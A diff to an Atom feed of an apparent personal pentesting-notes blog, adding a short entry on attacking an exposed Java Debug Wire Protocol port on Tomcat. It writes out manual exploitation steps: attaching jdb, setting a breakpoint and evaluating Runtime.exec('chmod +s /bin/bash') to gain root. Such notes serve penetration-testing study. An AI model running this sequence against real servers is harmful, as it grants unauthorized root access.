@@ -4,13 +4,50 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-06-13T17:55:21+08:00</updated>
+ <updated>2022-06-26T18:05:36+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Java Debug Wire Protocol (JDWP)</title>
+   <link href="https://mvineza.github.io/spindel/2022/06/26/java-debug-wire-protocol-jdwp"/>
+   <updated>2022-06-26T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/06/26/Java-Debug-Wire-Protocol--JDWP-</id>
+   <content type="html">&lt;h2 id=&quot;startup&quot;&gt;Startup&lt;/h2&gt;
+&lt;p&gt;This is included on tomcat startup parameters. Example.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-
+9.0.27/conf/logging.properties [...redacted...]
+-agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n [...redacted...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;attacks&quot;&gt;Attacks&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Privesc RCE if tomcat is running as root - this finds the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.lang.Runtime.getRuntime()&lt;/code&gt; to invoke &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec()&lt;/code&gt; passing a string object&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;manual-exploitation-of-rce&quot;&gt;Manual Exploitation of RCE&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jdb &lt;span class=&quot;nt&quot;&gt;-attach&lt;/span&gt; 127.0.0.1:8000
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; stop &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;javax.GenericServlet.init&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Set deferred breakpoint javax.servlet.GenericServlet.init&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+main[1] &lt;span class=&quot;nb&quot;&gt;eval &lt;/span&gt;new java.lang.Runtime&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;chmod +s /bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;tips&quot;&gt;Tips&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;If exploit is not working, ensure that tomcat is hitting a breakpoint. For example restart tomcat.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-jdwp-java-debug-wire-protocol&quot;&gt;Hacktricks - Pentesting JDWP&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>FTP</title>
